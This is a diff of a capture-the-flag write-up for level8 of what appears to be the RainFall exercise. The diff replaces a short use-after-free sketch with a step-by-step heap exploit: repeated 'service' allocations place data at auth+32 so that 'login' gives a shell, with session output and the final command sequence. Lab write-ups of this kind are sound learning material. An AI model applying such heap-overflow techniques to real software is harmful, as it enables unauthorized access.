@@ -1,20 +1,39 @@
-auth = struct{
-    char name[32]
-    int passwd
-}
+# level8
 
-auth = ptr1
-reset (auth still = ptr1)
-service = ptr1 (same ptr as auth)
-service = ptr2
-service = ptr3 = where should be auth.passwd
-login = check if auth.passwd == service (here true because auth.passwd was overwriten by 3rd malloc)
+- We see that if auth+32 is not empty we will have a shell
 
-```
-auth admin
-reset
-service 111
-service 222
-service 333
-login
-```
+- `auth ` is a malloc of 4
+
+- `service` is strdup(len(input))
+
+- So we can try to put value at auth + 32 since it's out of the allocated space
+
+- ```
+  level8@RainFall:~$ ./level8
+  (nil), (nil)
+  auth 
+  0x804a008, (nil)
+  ```
+
+- So we need something at `0x804a008+32` = `0x804a028`, `service` does not free and allocate after the other one so we can try to type service multiple time
+
+- ```
+  service
+  0x804a008, 0x804a018
+  service
+  0x804a008, 0x804a028
+  ```
+
+- Now that we have something at auth+32 we can try login :
+  ```
+  login
+  $
+  ```
+
+- To summarize :
+  ```
+  auth (with space)
+  service
+  service
+  login
+  ```
